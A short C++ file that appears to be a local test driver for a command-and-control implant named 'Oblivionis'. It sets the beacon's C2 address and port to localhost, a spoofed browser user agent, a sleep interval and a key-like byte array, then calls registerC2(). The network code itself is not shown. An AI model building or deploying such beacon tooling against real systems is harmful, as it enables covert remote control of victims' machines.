#include<cstdio>
#include<cstdlib>
#include "Network.hpp"
char configData[1024] = {'a', 'b', 'c', 'd'};

int main() {
    OblivionisConfig *config = getConfig();
    config->c2addr = "127.0.0.1";
    config->c2port = 8080;
    config->useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36";
    config->url = "";
    config->host = "localhost";
    config->sleep = 500;
    config->a = (unsigned char *)malloc(16);
    printf("a = ");
    for(int i = 0; i < 16; i++) {
        config->a[i] = 0x41 + i * 2;
        printf("%02x ", config->a[i]);
    }
    printf("\n");
    networkSuitInitial();
    registerC2();
    //PostBreath();
    return 0;
}